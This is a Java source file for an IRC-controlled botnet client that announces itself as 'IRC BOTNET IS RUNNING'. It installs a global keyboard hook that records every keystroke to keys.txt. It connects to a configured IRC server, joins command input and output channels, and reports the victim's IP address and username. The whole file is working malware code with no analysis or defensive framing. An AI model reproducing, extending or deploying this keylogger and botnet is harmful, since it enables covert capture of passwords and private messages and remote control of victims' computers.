package mn.num;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public class Main implements NativeKeyListener {
    private static final Logger logger = LoggerFactory.getLogger(Main.class);
    private static final Path file = Paths.get("keys.txt");
    static Socket mainSock = null;
    private static InputStream in = null;
    private static OutputStream out = null;
    private static boolean isConnected = false;
    private static IRCProcess ircProcess = new IRCProcess();
    private static Init init = new Init();
    public Main() {
    }

    public static void main(String args[]) throws InterruptedException {
        logger.debug("IRC BOTNET IS RUNNING!");
        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new Main());

        try {
            ConfigReader.read();
        } catch (Exception e) {
        }
        Thread.sleep(2000);
        try {
            setMainSock(new Socket(Config.getConnect(), Integer.parseInt(Config.getPort())));
            getMainSock().setTcpNoDelay(true);
            setOut(getMainSock().getOutputStream());
            setIn(getMainSock().getInputStream());
        } catch (Exception e) {
            Misc.print("Unable to connect to " + Config.getConnect() + ":" + Config.getPort());
            setIsConnected(false);
        }
        IRC.sendRawData("NICK " + Config.getNick());
        IRC.sendRawData("JOIN " + Config.getChannel());
        IRC.pass("lolwat");
        IRC.nick(Config.getNick());
        IRC.user(Config.getNick(), Misc.getIPAddress(), Config.getConnect(), Misc.getUsername());
        IRC.join(Config.getInputChannel(), Config.getInputChannelPassword());
        IRC.join(Config.getOutputChannel(), Config.getOutputChannelPassword());
        ircProcess.start();
        setIsConnected(true);
        Misc.print("Connection to " + Config.getConnect() + ":" + Config.getPort() + " was successful!");
        Misc.print("User settings: Nick: " + Config.getNick() + " | Channel: " + Config.getChannel());
        init.start();
        ProcessChecker proc = new ProcessChecker();
        proc.start();
    }

    private static void init() {
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }

        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }

    public static void setMainSock(Socket mainSockX) {
        mainSock = mainSockX;
    }
    public static Socket getMainSock() {
        return mainSock;
    }
    public static void setIn(InputStream inX) {
        in = inX;
    }

    public static InputStream getIn() {
        return in;
    }

    public static void setOut(OutputStream outX) {
        out = outX;
    }

    public static OutputStream getOut() {
        return out;
    }

    public static boolean getIsConnected() {
        return isConnected;
    }
    public static void setIsConnected(boolean isConnectedX) {
        isConnected = isConnectedX;
    }
}